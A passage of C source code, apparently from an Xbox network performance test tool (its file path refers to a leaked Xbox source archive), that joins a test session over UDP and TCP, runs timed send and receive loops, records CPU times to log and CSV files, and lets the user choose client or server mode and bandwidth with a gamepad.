    SESSION_MESSAGE  SessionMessageOut;
    // remotename is the remote address
    SOCKADDR_IN      remotename;
    // RemoteInAddr is the remote address
    IN_ADDR          RemoteInAddr;

    // readfds is the read socket set
    fd_set           readfds;
    // timeout it the select timeout
    timeval          timeout = { 1, 0 };
    // bContinue specifies to continue join
    BOOL             bContinue = FALSE;



    // Generate the session id
    XNetRandom(pSessionObject->SessionId, sizeof(pSessionObject->SessionId));

    // Set the session message
    ZeroMemory(&SessionMessageOut, sizeof(SessionMessageOut));

    SessionMessageOut.dwMessageId = SESSION_ENUM_MSG;
    SessionMessageOut.nSetup = nSetup;
    CopyMemory(SessionMessageOut.SessionId, pSessionObject->SessionId, sizeof(SessionMessageOut.SessionId));
    CopyMemory(&SessionMessageOut.FromXnAddr, &pSessionObject->LocalXnAddr, sizeof(SessionMessageOut.FromXnAddr));
    SessionMessageOut.nBandwidth = pSessionObject->nBandwidth;

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr.s_addr = INADDR_BROADCAST;
    remotename.sin_port = htons(pSessionObject->SessionPort);

    do {
        // Send the enum message
        sendto(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0, (SOCKADDR *) &remotename, sizeof(remotename));

        FD_ZERO(&readfds);
        FD_SET(pSessionObject->sSessionSocket, &readfds);

        while (1 == select(0, &readfds, NULL, NULL, &timeout)) {
            // Receive enum reply
            ZeroMemory(&SessionMessageIn, sizeof(SessionMessageIn));
            recvfrom(pSessionObject->sSessionSocket, (char *) &SessionMessageIn, sizeof(SessionMessageIn), 0, NULL, NULL);

            if ((0 == memcmp(SessionMessageOut.SessionId, SessionMessageIn.SessionId, sizeof(SessionMessageOut.SessionId))) && (SESSION_ENUM_REPLY == SessionMessageIn.dwMessageId) && (nSetup == SessionMessageIn.nSetup)) {
                bContinue = TRUE;
                break;
            }

            FD_ZERO(&readfds);
            FD_SET(pSessionObject->sSessionSocket, &readfds);
        }
    } while (FALSE == bContinue);

    // Copy the key id and key
    CopyMemory(&pSessionObject->XnKid, &SessionMessageIn.XnKid, sizeof(pSessionObject->XnKid));
    CopyMemory(&pSessionObject->XnKey, &SessionMessageIn.XnKey, sizeof(pSessionObject->XnKey));

    // Register the key
    XNetRegisterKey(&pSessionObject->XnKid, &pSessionObject->XnKey);
    pSessionObject->bXnKey = TRUE;

    // Resolve the remote name
    if (FALSE == bSecure) {
        RemoteInAddr = SessionMessageIn.FromXnAddr.ina;
    }
    else {
        XNetXnAddrToInAddr(&SessionMessageIn.FromXnAddr, &pSessionObject->XnKid, &RemoteInAddr);
    }

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr = RemoteInAddr;
    remotename.sin_port = htons(pSessionObject->SessionPort);

    // Connect the session socket
    connect(pSessionObject->sSessionSocket, (SOCKADDR *) &remotename, sizeof(remotename));

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr = RemoteInAddr;
    remotename.sin_port = htons(pSessionObject->UDPPort);

    // Connect the UDP connection
    connect(pSessionObject->sUDPSocket, (SOCKADDR *) &remotename, sizeof(remotename));

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr = RemoteInAddr;
    remotename.sin_port = htons(pSessionObject->TCPPort);

    // Connect the TCP connection
    connect(pSessionObject->sTCPConnectSocket, (SOCKADDR *) &remotename, sizeof(remotename));

    // Set the session message
    ZeroMemory(&SessionMessageOut, sizeof(SessionMessageOut));

    SessionMessageOut.dwMessageId = SESSION_CONNECT_MSG;
    SessionMessageOut.nSetup = nSetup;
    CopyMemory(SessionMessageOut.SessionId, pSessionObject->SessionId, sizeof(SessionMessageOut.SessionId));
    CopyMemory(&SessionMessageOut.FromXnAddr, &pSessionObject->LocalXnAddr, sizeof(SessionMessageOut.FromXnAddr));
    SessionMessageOut.nBandwidth = pSessionObject->nBandwidth;

    // Send the connect message
    send(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0);

    // Wait for the connect reply
    ZeroMemory(&SessionMessageIn, sizeof(SessionMessageIn));
    recv(pSessionObject->sSessionSocket, (char *) &SessionMessageIn, sizeof(SessionMessageIn), 0);

    // Return the remote addr
    pSessionObject->RemoteAddr = RemoteInAddr.s_addr;
}



VOID
SendSession(
    IN SOCKET  sSocket,
    IN char    *Buffer,
    IN int     len,
    IN int     totallen,
    IN DOUBLE  SleepTime
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Runs a send session

Arguments:

  sSocket - Specifies the socket descriptor
  Buffer - Pointer to the buffer
  len - Specifies the length of the buffer
  totallen - Specifies the total length of the buffer
  SleepTime - Specifies the sleep time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // nIndex is an integer index into the buffer
    int     *nIndex = (int *) Buffer;
    // nTotal is a counter to enumerate the total buffer
    int     nTotal = 0;
    // nAck is a counter to enumerate the ack
    int     nAck = 0;
    // SleepUntilTime is the sleep until time
    DOUBLE  SleepUntilTime;



    if (0 != SleepTime) {
        // Get the initial time
        SleepUntilTime = (DOUBLE) GetTickCount();
        SleepUntilTime += SleepTime;
    }

    for (nTotal = 0; nTotal < totallen; nTotal += nAck) {
        for (nAck = 0; (nAck < BUFFER_BYTES_ACK_SIZE) && ((nTotal + nAck) < totallen); nAck += len) {
            nIndex[0] = nTotal;
            nIndex[1] = nAck;

            // Send
            if (SOCKET_ERROR == send(sSocket, Buffer, len, 0)) {
                DbgPrint("send [%u][%u] failed\n  sSocket = 0x%08x\n  ec = %u\n", nTotal, nAck, sSocket, WSAGetLastError());
                __asm int 3;
            }

            if (0 != SleepTime) {
                if (SleepUntilTime > GetTickCount()) {
                    Sleep((DWORD) SleepUntilTime - GetTickCount());
                }
                SleepUntilTime += SleepTime;
            }
        }

        // Recv
        if (SOCKET_ERROR == recv(sSocket, Buffer, len, 0)) {
            DbgPrint("recv [%u][%u] failed\n  sSocket = 0x%08x\n  ec = %u\n", nTotal, nAck, sSocket, WSAGetLastError());
            __asm int 3;
        }
    }
}



VOID
RecvSession(
    IN SOCKET  sSocket,
    IN char    *Buffer,
    IN int     len,
    IN int     totallen
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Runs a recv session

Arguments:

  sSocket - Specifies the socket descriptor
  Buffer - Pointer to the buffer
  len - Specifies the length of the buffer
  totallen - Specifies the total length of the buffer

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // nTotal is a counter to enumerate the total buffer
    int  nTotal = 0;
    // nAck is a counter to enumerate the ack
    int  nAck = 0;



    for (nTotal = 0; nTotal < totallen; nTotal += nAck) {
        for (nAck = 0; (nAck < BUFFER_BYTES_ACK_SIZE) && ((nTotal + nAck) < totallen); nAck += len) {
            // Recv
            if (SOCKET_ERROR == recv(sSocket, Buffer, len, 0)) {
                DbgPrint("recv [%u][%u] failed\n  sSocket = 0x%08x\n  ec = %u\n", nTotal, nAck, sSocket, WSAGetLastError());
                __asm int 3;
            }
        }

        // Send
        if (SOCKET_ERROR == send(sSocket, Buffer, len, 0)) {
            DbgPrint("send [%u][%u] failed\n  sSocket = 0x%08x\n  ec = %u\n", nTotal, nAck, sSocket, WSAGetLastError());
            __asm int 3;
        }
    }
}



VOID
TestSession(
    IN PSESSION_OBJECT  pSessionObject,
    IN BOOL             bSend,
    IN HANDLE           hLogAll,
    IN HANDLE           hLogSummary,
    IN HANDLE           hLogCsv
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Runs a test session

Arguments:

  pSessionObject - Pointer to the session object
  bSend - Specifies send or receive
  hLogAll - Handle to the log file
  hLogSummary - Handle to the summary log file
  hLogCsv - Handle to the csv log file

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // dwTestIndex is a counter to enumerate each test
    DWORD            dwTestIndex;
    // nIteration is a counter to enumerate each iteration
    INT              nIteration;

    // nPayloadTotal is the total payload
    INT              nPayloadTotal;
    // nEthernetTotal is the total ethernet
    INT              nEthernetTotal;
    // SendRate is the send rate
    DOUBLE           SendRate;

    // NetworkBuffer is the network buffer
    char             NetworkBuffer[1024];

    // SessionMessageIn is a session message
    SESSION_MESSAGE  SessionMessageIn;
    // SessionMessageOut is a session message
    SESSION_MESSAGE  SessionMessageOut;

    // KernelTimeInitial is the initial kernel time
    ULONG            KernelTimeInitial;
    // KernelTimeFinal is the final kernel time
    ULONG            KernelTimeFinal;
    // KernelTimeTotal is the final kernel time
    ULONG            KernelTimeTotal;
    // InterruptTimeInitial is the initial interrupt time
    ULONG            InterruptTimeInitial;
    // InterruptTimeFinal is the final interrupt time
    ULONG            InterruptTimeFinal;
    // InterruptTimeTotal is the total interrupt time
    ULONG            InterruptTimeTotal;
    // DpcTimeInitial is the initial dpc time
    ULONG            DpcTimeInitial;
    // DpcTimeFinal is the final dpc time
    ULONG            DpcTimeFinal;
    // DpcTimeTotal is the total dpc time
    ULONG            DpcTimeTotal;
    // IdleTimeInitial is the initial idle time
    ULONG            IdleTimeInitial;
    // IdleTimeFinal is the final idle time
    ULONG            IdleTimeFinal;
    // IdleTimeTotal is the total idle time
    ULONG            IdleTimeTotal;



    // Initialize the buffer
    XNetRandom((BYTE *) NetworkBuffer, sizeof(NetworkBuffer));

    for (dwTestIndex = 0; dwTestIndex < TestTableCount; dwTestIndex++) {
        // Initialize the time
        ZeroMemory(&KernelTimeTotal, sizeof(KernelTimeTotal));
        ZeroMemory(&InterruptTimeTotal, sizeof(InterruptTimeTotal));
        ZeroMemory(&DpcTimeTotal, sizeof(DpcTimeTotal));
        ZeroMemory(&IdleTimeTotal, sizeof(IdleTimeTotal));

        for (nIteration = 0; nIteration < ITERATIONS_DEFAULT; nIteration++) {
            // Initialize the CPU times
            ZeroMemory(&KernelTimeInitial, sizeof(KernelTimeInitial));
            ZeroMemory(&KernelTimeFinal, sizeof(KernelTimeFinal));
            ZeroMemory(&InterruptTimeInitial, sizeof(InterruptTimeInitial));
            ZeroMemory(&InterruptTimeFinal, sizeof(InterruptTimeFinal));
            ZeroMemory(&DpcTimeInitial, sizeof(DpcTimeInitial));
            ZeroMemory(&DpcTimeFinal, sizeof(DpcTimeFinal));
            ZeroMemory(&IdleTimeInitial, sizeof(IdleTimeInitial));
            ZeroMemory(&IdleTimeFinal, sizeof(IdleTimeFinal));

            // Calculate the send info
            if (SOCK_STREAM == TestTable[dwTestIndex].type) {
                nPayloadTotal = CalculatePayloadTotal(pSessionObject->nBandwidth, TestTable[dwTestIndex].len, pSessionObject->nTCPOverhead);
                nEthernetTotal = CalculateEthernetTotal(nPayloadTotal, TestTable[dwTestIndex].len, pSessionObject->nTCPOverhead);
                SendRate = CalculateSendRate(pSessionObject->nBandwidth, TestTable[dwTestIndex].len, pSessionObject->nTCPOverhead);
            }
            else {
                nPayloadTotal = CalculatePayloadTotal(pSessionObject->nBandwidth, TestTable[dwTestIndex].len, pSessionObject->nUDPOverhead);
                nEthernetTotal = CalculateEthernetTotal(nPayloadTotal, TestTable[dwTestIndex].len, pSessionObject->nUDPOverhead);
                SendRate = CalculateSendRate(pSessionObject->nBandwidth, TestTable[dwTestIndex].len, pSessionObject->nUDPOverhead);
            }

            // Set the session message
            ZeroMemory(&SessionMessageIn, sizeof(SessionMessageIn));
            ZeroMemory(&SessionMessageOut, sizeof(SessionMessageOut));

            if (TRUE == bSend) {
                // Send the ready message
                SessionMessageOut.dwMessageId = SESSION_READY_MSG;
                send(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0);

                // Receive the ready reply
                recv(pSessionObject->sSessionSocket, (char *) &SessionMessageIn, sizeof(SessionMessageIn), 0);
            }
            else {
                // Receive the ready message
                recv(pSessionObject->sSessionSocket, (char *) &SessionMessageIn, sizeof(SessionMessageIn), 0);

                // Send the ready reply
                SessionMessageOut.dwMessageId = SESSION_READY_REPLY;
                send(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0);
            }

            // Query the CPU times
            GetCpuTimes(&KernelTimeInitial, &InterruptTimeInitial, &DpcTimeInitial, &IdleTimeInitial);

            // Run the test
            if (SOCK_STREAM == TestTable[dwTestIndex].type) {
                if (TRUE == bSend) {
                    SendSession((INVALID_SOCKET != pSessionObject->sTCPAcceptSocket) ? pSessionObject->sTCPAcceptSocket : pSessionObject->sTCPConnectSocket, NetworkBuffer, TestTable[dwTestIndex].len, nPayloadTotal, (0 != SendRate) ? (1000 / SendRate) : 0);
                }
                else {
                    RecvSession((INVALID_SOCKET != pSessionObject->sTCPAcceptSocket) ? pSessionObject->sTCPAcceptSocket : pSessionObject->sTCPConnectSocket, NetworkBuffer, TestTable[dwTestIndex].len, nPayloadTotal);
                }
            }
            else {
                if (TRUE == bSend) {
                    SendSession(pSessionObject->sUDPSocket, NetworkBuffer, TestTable[dwTestIndex].len, nPayloadTotal, (0 != SendRate) ? (1000 / SendRate) : 0);
                }
                else {
                    RecvSession(pSessionObject->sUDPSocket, NetworkBuffer, TestTable[dwTestIndex].len, nPayloadTotal);
                }
            }

            // Query the CPU times
            GetCpuTimes(&KernelTimeFinal, &InterruptTimeFinal, &DpcTimeFinal, &IdleTimeFinal);

            // Log the stats
            LogStats(hLogAll, TestTable[dwTestIndex].lpszTestName, nIteration, TestTable[dwTestIndex].len, nPayloadTotal, (SOCK_STREAM == TestTable[dwTestIndex].type) ? pSessionObject->nTCPOverhead : pSessionObject->nUDPOverhead, nEthernetTotal, KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal);
            CalculateAndAddStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, &KernelTimeTotal, &InterruptTimeTotal, &DpcTimeTotal, &IdleTimeTotal);
        }

        // Log the stats
        LogStatsSummary(hLogSummary, TestTable[dwTestIndex].lpszTestName, TestTable[dwTestIndex].len, nPayloadTotal, (SOCK_STREAM == TestTable[dwTestIndex].type) ? pSessionObject->nTCPOverhead : pSessionObject->nUDPOverhead, nEthernetTotal, KernelTimeTotal, InterruptTimeTotal, DpcTimeTotal, IdleTimeTotal, ITERATIONS_DEFAULT);
        LogStatsCsv(hLogCsv, (SOCK_STREAM == TestTable[dwTestIndex].type) ? "TCP" : "UDP", TestTable[dwTestIndex].len, nPayloadTotal, (SOCK_STREAM == TestTable[dwTestIndex].type) ? pSessionObject->nTCPOverhead : pSessionObject->nUDPOverhead, nEthernetTotal, KernelTimeTotal, InterruptTimeTotal, DpcTimeTotal, IdleTimeTotal, ITERATIONS_DEFAULT);
    }
}



void __cdecl main()
{
    // dwLinkStatus is the Ethernet link status
    DWORD              dwLinkStatus = 0;

    // hDevices is an array of handles to the devices
    HANDLE             hDevices[4];
    // dwCurrentDevice is a counter to enumerate each device
    DWORD              dwCurrentDevice = 0;
    // dwInsertions is a bit mask of device insertions
    DWORD              dwInsertions;
    // dwRemovals is a bit mask of device removals
    DWORD              dwRemovals;
    // XInputState is the current device state
    XINPUT_STATE       XInputState;
    // dwUpButton specifies if up is pressed
    DWORD              dwUpButtonFirst[4] = { 0, 0, 0, 0 };
    DWORD              dwUpButtonLast[4] = { 0, 0, 0, 0 };
    // dwDownButton specifies if down is pressed
    DWORD              dwDownButtonFirst[4] = { 0, 0, 0, 0 };
    DWORD              dwDownButtonLast[4] = { 0, 0, 0, 0 };
    // bStartButton specifies if start is pressed
    BOOL               bStartButton[4] = { FALSE, FALSE, FALSE, FALSE };

    // bClient specifies the client session
    BOOL               bClient = FALSE;
    // nBandwidth specifies the bandwidth usage
    INT                nBandwidth = BANDWIDTH_DEFAULT;
    // nIncreaseIncrement specifies the increase increment
    INT                nIncreaseIncrement = 0;
    // nDecreaseIncrement specifies the decrease increment
    INT                nDecreaseIncrement = 0;
    // bContinue specifies if continue
    BOOL               bContinue = FALSE;

    // szLogFileName is the name of the log file
    CHAR               szLogFileName[MAX_PATH];
    // hLogAll is a handle to the log file
    HANDLE             hLogAll = INVALID_HANDLE_VALUE;
    // hLogSummary is a handle to the summary log file
    HANDLE             hLogSummary = INVALID_HANDLE_VALUE;
    // hLogCsv is a handle to the csv log file
    HANDLE             hLogCsv = INVALID_HANDLE_VALUE;

    // nSetup is a counter to enumerate each test setup
    INT                nSetup = 0;

    // XNetParams is the xnet startup params
    XNetStartupParams  XNetParams;
    // WSAData is the details of the Winsock implementation
    WSADATA            WSAData;

    // pSessionObject is the pointer to session object
    PSESSION_OBJECT    pSessionObject = NULL;



    // Get the Ethernet link status
    dwLinkStatus = XNetGetEthernetLinkStatus();
    DbgPrint("Ethernet Link Status:\n");

    if (0 != (XNET_ETHERNET_LINK_ACTIVE & dwLinkStatus)) {
        DbgPrint("  Connected\n");
    }
    else {
        DbgPrint("  Disconnected\n");
    }

    if (0 != (XNET_ETHERNET_LINK_100MBPS & dwLinkStatus)) {
        DbgPrint("  Speed: 100Mbps\n");
    }
    else if (0 != (XNET_ETHERNET_LINK_10MBPS & dwLinkStatus)) {
        DbgPrint("  Speed: 10Mbps\n");
    }
    else {
        DbgPrint("  Speed: Unknown\n");
    }

    if (0 != (XNET_ETHERNET_LINK_FULL_DUPLEX & dwLinkStatus)) {
        DbgPrint("  Mode: Full Duplex\n");
    }
    else if (0 != (XNET_ETHERNET_LINK_HALF_DUPLEX & dwLinkStatus)) {
        DbgPrint("  Mode: Half Duplex\n");
    }
    else {
        DbgPrint("  Mode: Unknown\n");
    }

    // Initialize the USB stack
    XInitDevices(0, NULL);

    // Initialize the array of device handles
    ZeroMemory(hDevices, sizeof(HANDLE) * XGetPortCount());

    bContinue = FALSE;
    DbgPrint("Press 'Up' or 'Down' to change session.\n");
    DbgPrint("  Session: %s\n", (TRUE == bClient) ? "Client" : "Server");

    do {
        // Get for hotplug insertions or removals
        if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_GAMEPAD, &dwInsertions, &dwRemovals)) {
            dwInsertions = 0;
            dwRemovals = 0;
        }

        for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
            // Close the device if it has been removed
            if ((1 << dwCurrentDevice) & dwRemovals) {
                XInputClose(hDevices[dwCurrentDevice]);
                hDevices[dwCurrentDevice] = NULL;
            }

            // Open the device if it has been inserted
            if ((1 << dwCurrentDevice) & dwInsertions) {
                hDevices[dwCurrentDevice] = XInputOpen(XDEVICE_TYPE_GAMEPAD, XDEVICE_PORT0 + dwCurrentDevice, XDEVICE_NO_SLOT, NULL);
            }

            // Get the current device state
            if (NULL != hDevices[dwCurrentDevice]) {
                XInputGetState(hDevices[dwCurrentDevice], &XInputState);

                if ((XINPUT_GAMEPAD_DPAD_UP & XInputState.Gamepad.wButtons) || ((SHRT_MAX / 5) < XInputState.Gamepad.sThumbLY)) {
                    if (0 == dwUpButtonFirst[dwCurrentDevice]) {
                        if (TRUE == bClient) {
                            bClient = FALSE;

                            DbgPrint("  Session: Server\n");
                        }
                    }

                    dwUpButtonFirst[dwCurrentDevice] = GetTickCount();
                }
                else {
                    dwUpButtonFirst[dwCurrentDevice] = 0;
                    dwUpButtonLast[dwCurrentDevice] = 0;
                }

                if ((XINPUT_GAMEPAD_DPAD_DOWN & XInputState.Gamepad.wButtons) || ((SHRT_MIN / 5) > XInputState.Gamepad.sThumbLY)) {
                    if (0 == dwDownButtonFirst[dwCurrentDevice]) {
                        if (FALSE == bClient) {
                            bClient = TRUE;

                            DbgPrint("  Session: Client\n");
                        }
                    }

                    dwDownButtonFirst[dwCurrentDevice] = GetTickCount();
                }
                else {
                    dwDownButtonFirst[dwCurrentDevice] = 0;
                    dwDownButtonLast[dwCurrentDevice] = 0;
                }

                if ((XINPUT_GAMEPAD_START & XInputState.Gamepad.wButtons) || (XINPUT_GAMEPAD_MAX_CROSSTALK < XInputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_A])) {
                    if (FALSE == bStartButton[dwCurrentDevice]) {
                        bContinue = TRUE;
                    }

                    bStartButton[dwCurrentDevice] = TRUE;
                }
                else {
                    bStartButton[dwCurrentDevice] = FALSE;
                }
            }
        }
    } while (FALSE == bContinue);

    if (TRUE == bClient) {
        bContinue = FALSE;
        nIncreaseIncrement = 0;
        nDecreaseIncrement = 0;
        DbgPrint("Press 'Up' to increase bandwidth usage.\n");
        DbgPrint("Press 'Down' to decrease bandwidth usage.\n");
        DbgPrint("  Bandwidth Usage: %d kbps\n", nBandwidth);

        do {
            // Get for hotplug insertions or removals
            if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_GAMEPAD, &dwInsertions, &dwRemovals)) {
                dwInsertions = 0;
                dwRemovals = 0;
            }

            for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
                // Close the device if it has been removed
                if ((1 << dwCurrentDevice) & dwRemovals) {
                    XInputClose(hDevices[dwCurrentDevice]);
                    hDevices[dwCurrentDevice] = NULL;
                }

                // Open the device if it has been inserted
                if ((1 << dwCurrentDevice) & dwInsertions) {
                    hDevices[dwCurrentDevice] = XInputOpen(XDEVICE_TYPE_GAMEPAD, XDEVICE_PORT0 + dwCurrentDevice, XDEVICE_NO_SLOT, NULL);
                }

                // Get the current device state
                if (NULL != hDevices[dwCurrentDevice]) {
                    XInputGetState(hDevices[dwCurrentDevice], &XInputState);

                    if ((XINPUT_GAMEPAD_DPAD_UP & XInputState.Gamepad.wButtons) || ((SHRT_MAX / 5) < XInputState.Gamepad.sThumbLY)) {
                        if (0 == dwUpButtonFirst[dwCurrentDevice]) {
                            dwUpButtonFirst[dwCurrentDevice] = GetTickCount();
                        }

                        if (0 != nIncreaseIncrement) {
                            if (250 < (GetTickCount() - dwUpButtonLast[dwCurrentDevice])) {
                                if (BANDWIDTH_MAX > nBandwidth) {
                                    nBandwidth += nIncreaseIncrement;

                                    if (BANDWIDTH_MAX < nBandwidth) {
                                        nBandwidth = BANDWIDTH_MAX;
                                    }

                                    if (BANDWIDTH_MAX == nBandwidth) {
                                        DbgPrint("  Bandwidth Usage: Max\n");
                                    }
                                    else {
                                        DbgPrint("  Bandwidth Usage: %d kbps\n", nBandwidth);
                                    }
                                }

                                dwUpButtonLast[dwCurrentDevice] = GetTickCount();
                            }

                            if (6000 < (GetTickCount() - dwUpButtonFirst[dwCurrentDevice])) {
                                nIncreaseIncrement = 512;
                            }
                            else if (4000 < (GetTickCount() - dwUpButtonFirst[dwCurrentDevice])) {
                                nIncreaseIncrement = 128;
                            }
                            else if (2000 < (GetTickCount() - dwUpButtonFirst[dwCurrentDevice])) {
                                nIncreaseIncrement = 32;
                            }
                        }
                    }
                    else {
                        dwUpButtonFirst[dwCurrentDevice] = 0;
                        dwUpButtonLast[dwCurrentDevice] = 0;
                        nIncreaseIncrement = 8;
                    }

                    if ((XINPUT_GAMEPAD_DPAD_DOWN & XInputState.Gamepad.wButtons) || ((SHRT_MIN / 5) > XInputState.Gamepad.sThumbLY)) {
                        if (0 == dwDownButtonFirst[dwCurrentDevice]) {
                            dwDownButtonFirst[dwCurrentDevice] = GetTickCount();
                        }

                        if (0 != nDecreaseIncrement) {
                            if (250 < (GetTickCount() - dwDownButtonLast[dwCurrentDevice])) {
                                if (BANDWIDTH_MIN < nBandwidth) {
                                    nBandwidth -= nDecreaseIncrement;

                                    if (BANDWIDTH_MIN > nBandwidth) {
                                        nBandwidth = BANDWIDTH_MIN;
                                    }

                                    if (BANDWIDTH_MAX == nBandwidth) {
                                        DbgPrint("  Bandwidth Usage: Max\n");
                                    }
                                    else {
                                        DbgPrint("  Bandwidth Usage: %d kbps\n", nBandwidth);
                                    }
                                }

                                dwDownButtonLast[dwCurrentDevice] = GetTickCount();
                            }

                            if (6000 < (GetTickCount() - dwDownButtonFirst[dwCurrentDevice])) {
                                nDecreaseIncrement = 512;
                            }
                            else if (4000 < (GetTickCount() - dwDownButtonFirst[dwCurrentDevice])) {
                                nDecreaseIncrement = 128;
                            }
                            else if (2000 < (GetTickCount() - dwDownButtonFirst[dwCurrentDevice])) {
                                nDecreaseIncrement = 32;
                            }
                        }
                    }
                    else {
                        dwDownButtonFirst[dwCurrentDevice] = 0;
                        dwDownButtonLast[dwCurrentDevice] = 0;
                        nDecreaseIncrement = 8;
                    }

                    if ((XINPUT_GAMEPAD_START & XInputState.Gamepad.wButtons) || (XINPUT_GAMEPAD_MAX_CROSSTALK < XInputState.Gamepad.bAnalogButtons[XINPUT_GAMEPAD_A])) {
                        if (FALSE == bStartButton[dwCurrentDevice]) {
                            bContinue = TRUE;
                        }

                        bStartButton[dwCurrentDevice] = TRUE;
                    }
                    else {
                        bStartButton[dwCurrentDevice] = FALSE;
                    }
                }
            }
        } while (FALSE == bContinue);
    }

    if (TRUE == bClient) {
        DbgPrint("\n");
        if (BANDWIDTH_MAX == nBandwidth) {
            DbgPrint("Client Started - Bandwidth Usage: Max\n\n");
        }
        else {
            DbgPrint("Client Started - Bandwidth Usage: %d kbps\n\n", nBandwidth);
        }
    }
    else {
        DbgPrint("\n");
        DbgPrint("Server Started\n\n");
    }

    // Close any open devices
    for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
        if (NULL != hDevices[dwCurrentDevice]) {
            XInputClose(hDevices[dwCurrentDevice]);
        }
    }

    for (nSetup = 0; nSetup < SetupTableCount; nSetup++) {
        // Initialize XNet and Winsock
        ZeroMemory(&XNetParams, sizeof(XNetParams));
        XNetParams.cfgSizeOfStruct = sizeof(XNetParams);
        XNetParams.cfgFlags = SetupTable[nSetup].cfgFlags;
        XNetParams.cfgPrivatePoolSizeInPages = 255;
        XNetParams.cfgEnetReceiveQueueLength = 255;
        XNetParams.cfgSockDefaultRecvBufsizeInK = BUFFER_KBYTES_ACK_SIZE;

        XNetStartup(&XNetParams);
    
        WSAStartup(MAKEWORD(2, 2), &WSAData);



        // Create the session
        pSessionObject = CreateSession((TRUE == bClient) ? nBandwidth : 0, SetupTable[nSetup].nTCPOverhead, SetupTable[nSetup].nUDPOverhead);

        // Join or host a session
        if (TRUE == bClient) {
            // Join the session
            JoinSession(pSessionObject, nSetup, SetupTable[nSetup].bSecure);
        }
        else {
            // Host the session
            nBandwidth = HostSession(pSessionObject, nSetup, SetupTable[nSetup].bSecure);
        }



        // Open the log file
        CreateDirectory("T:\\XNetPerf", NULL);
        if (BANDWIDTH_MAX == nBandwidth) {
            sprintf(szLogFileName, "T:\\XNetPerf\\Max %s %s All.log", SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        else {
            sprintf(szLogFileName, "T:\\XNetPerf\\%dkbps %s %s All.log", nBandwidth, SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        hLogAll = CreateFile(szLogFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (BANDWIDTH_MAX == nBandwidth) {
            sprintf(szLogFileName, "T:\\XNetPerf\\Max %s %s Summary.log", SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        else {
            sprintf(szLogFileName, "T:\\XNetPerf\\%dkbps %s %s Summary.log", nBandwidth, SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        hLogSummary = CreateFile(szLogFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (BANDWIDTH_MAX == nBandwidth) {
            sprintf(szLogFileName, "T:\\XNetPerf\\Max %s %s.csv", SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        else {
            sprintf(szLogFileName, "T:\\XNetPerf\\%dkbps %s %s.csv", nBandwidth, SetupTable[nSetup].lpszSecurityName, (TRUE == bClient) ? "Send" : "Receive");
        }
        hLogCsv = CreateFile(szLogFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        LogCsvHeader(hLogCsv);

        // Flush the file buffers to prevent corruption
        FlushFileBuffers(hLogAll);
        FlushFileBuffers(hLogSummary);
        FlushFileBuffers(hLogCsv);



        // Run the test session
        TestSession(pSessionObject, bClient, hLogAll, hLogSummary, hLogCsv);



        // Close the session
        CloseSession(pSessionObject);

        // Flush the file buffers to prevent corruption
        // Close the log file
        FlushFileBuffers(hLogAll);
        CloseHandle(hLogAll);

        FlushFileBuffers(hLogSummary);
        CloseHandle(hLogSummary);

        FlushFileBuffers(hLogCsv);
        CloseHandle(hLogCsv);

        // Cleanup Winsock
        WSACleanup();

        // Cleanup XNet
        XNetCleanup();
    }

    // Launch the dashboard
    XLaunchNewImage(NULL, NULL);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sendrecv\sendrecv.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "sendrecv.h"

//==================================================================================
// Globals
//==================================================================================
CRITICAL_SECTION g_csSerializeAccess;

//==================================================================================
// Functions
//==================================================================================

//==================================================================================
// MyLog
//----------------------------------------------------------------------------------
//
// Description: Output log function
//
// Arguments:
